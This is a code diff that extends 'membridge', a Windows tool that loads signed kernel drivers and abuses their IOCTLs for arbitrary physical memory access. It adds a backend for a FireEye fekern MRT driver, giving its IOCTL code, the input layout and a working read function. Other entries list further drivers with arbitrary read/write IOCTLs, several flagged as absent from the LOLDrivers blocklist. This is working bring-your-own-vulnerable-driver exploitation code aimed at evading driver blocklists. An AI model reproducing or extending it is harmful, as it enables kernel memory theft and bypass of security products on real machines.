@@ -25,7 +25,7 @@
 #include <stdlib.h>
 
 typedef enum { BK_CONTROL, BK_FILTER } bind_kind;
-typedef enum { LY_CCHWAPI, LY_CCHWAPI_EXT, LY_SJT, LY_UFU, LY_WINRING0, LY_HP_MAP, LY_RTKIO_MAP, LY_ENEIO_MAP, LY_GLCKIO2_MAP, LY_GIBEPEXT, LY_FASTDUMP, LY_DIRECTIO, LY_TDEIO, LY_ICACHEX } layout_t;
+typedef enum { LY_CCHWAPI, LY_CCHWAPI_EXT, LY_SJT, LY_UFU, LY_WINRING0, LY_HP_MAP, LY_RTKIO_MAP, LY_ENEIO_MAP, LY_GLCKIO2_MAP, LY_GIBEPEXT, LY_FASTDUMP, LY_DIRECTIO, LY_TDEIO, LY_ICACHEX, LY_MRT } layout_t;
 
 typedef struct {
     const wchar_t *id;
@@ -102,6 +102,9 @@ static const backend_t g_backends[] = {
     { L"icachex", L"drivers\\icachex\\iCacheX.sys",
       BK_CONTROL, L"MembridgeICacheX", L"\\\\.\\iCacheX", LY_ICACHEX, 1,
       L"iCacheX(1).sys (LOLDrivers unlisted; embeds OlsApi: OlsApiReadMemory 0x9C406104 + OlsApiWriteMemory 0x9C40A108, arbitrary 64-bit physical read/write)" },
+    { L"mrt", L"drivers\\mrt\\fekern_mrt.sys",
+      BK_CONTROL, L"MembridgeFekern", L"\\\\.\\fekern_00", LY_MRT, 1,
+      L"FireEye fekern MRT driver (LOLDrivers unlisted WHQL Publisher.sys; MRT_IOCTL_READ_PHYSICALMEMORY 0x70F8800C via MmCopyMemory, arbitrary 64-bit physical read; device ACL SYSTEM-only)" },
     { L"ufu_win10", L"drivers\\ufu\\win10_ufudev64.sys",
       BK_CONTROL, L"MembridgeUfu", L"\\\\.\\UFU", LY_UFU, 0,
       L"win10_ufudev64.sys (IOCTL 0x8010206E, 32-bit PA, 0x1024 bytes)" },
@@ -140,6 +143,7 @@ static const char *layout_name(layout_t l) {
     case LY_DIRECTIO: return "directio";
     case LY_TDEIO: return "tdeio";
     case LY_ICACHEX: return "icachex";
+    case LY_MRT: return "mrt";
     }
     return "?";
 }
@@ -761,6 +765,23 @@ static int read_icachex(HANDLE dev, uint64_t pa, uint32_t size, uint8_t *out) {
     return 1;
 }
 
+// FireEye fekern MRT driver (unlisted): MRT_IOCTL_READ_PHYSICALMEMORY 0x70F8800C.
+// Input 16 bytes: {u64 PA; u32 size; u32 flags}; output = size bytes; driver calls
+// MmCopyMemory(output, PA, size, MM_COPY_MEMORY_PHYSICAL). Device ACL is SYSTEM-only.
+static int read_mrt(HANDLE dev, uint64_t pa, uint32_t size, uint8_t *out) {
+    uint8_t in[16];
+    DWORD ret = 0;
+    memset(in, 0, sizeof(in));
+    *(uint64_t *)(in + 0) = pa;
+    *(uint32_t *)(in + 8) = size;
+    *(uint32_t *)(in + 12) = 0;
+    if (!DeviceIoControl(dev, 0x70F8800Cu, in, sizeof(in), out, size, &ret, NULL)) {
+        wprintf(L"[ERR] mrt MRT_IOCTL_READ_PHYSICALMEMORY err=%lu\n", GetLastError());
+        return 0;
+    }
+    return 1;
+}
+
 static int backend_read(HANDLE dev, layout_t ly, uint64_t pa, uint32_t size, uint8_t *out) {
     switch (ly) {
     case LY_CCHWAPI: return read_cchwapi(dev, pa, size, out);
@@ -777,6 +798,7 @@ static int backend_read(HANDLE dev, layout_t ly, uint64_t pa, uint32_t size, uin
     case LY_DIRECTIO: return read_directio(dev, pa, size, out);
     case LY_TDEIO: return read_tdeio(dev, pa, size, out);
     case LY_ICACHEX: return read_icachex(dev, pa, size, out);
+    case LY_MRT: return read_mrt(dev, pa, size, out);
     }
     return 0;
 }
@@ -818,7 +840,7 @@ static void usage(void) {
     wprintf(L"  membridge --list\n");
     wprintf(L"  membridge --backend <id> --pa <hex> --size <n> [--expect <ascii>] [--dump] [--keep]\n");
     wprintf(L"               [--driver-path <path>] [--no-load]\n");
-    wprintf(L"  membridge --device <\\\\.\\NAME> --layout <cchwapi|cchwapi_ext|sjtwinio|ufu|winring0|hp_swtools|rtkio|eneio64|glckio2|gibepext|fastdump|directio|tdeio|icachex>\n");
+    wprintf(L"  membridge --device <\\\\.\\NAME> --layout <cchwapi|cchwapi_ext|sjtwinio|ufu|winring0|hp_swtools|rtkio|eneio64|glckio2|gibepext|fastdump|directio|tdeio|icachex|mrt>\n");
     wprintf(L"               --pa <hex> --size <n> [--expect <ascii>] [--dump]\n\n");
     wprintf(L"Backends (64-bit PA capable: *):\n");
     for (int i = 0; i < NBACKENDS; i++) {
@@ -874,6 +896,7 @@ int wmain(int argc, wchar_t **argv) {
         else if (_wcsicmp(layout, L"directio") == 0) g_manual_layout = LY_DIRECTIO;
         else if (_wcsicmp(layout, L"tdeio") == 0) g_manual_layout = LY_TDEIO;
         else if (_wcsicmp(layout, L"icachex") == 0) g_manual_layout = LY_ICACHEX;
+        else if (_wcsicmp(layout, L"mrt") == 0 || _wcsicmp(layout, L"fekern") == 0) g_manual_layout = LY_MRT;
         else { wprintf(L"[ERR] unknown layout %ls\n", layout); return 6; }
     } else if (backend) {
         for (int i = 0; i < NBACKENDS; i++) {
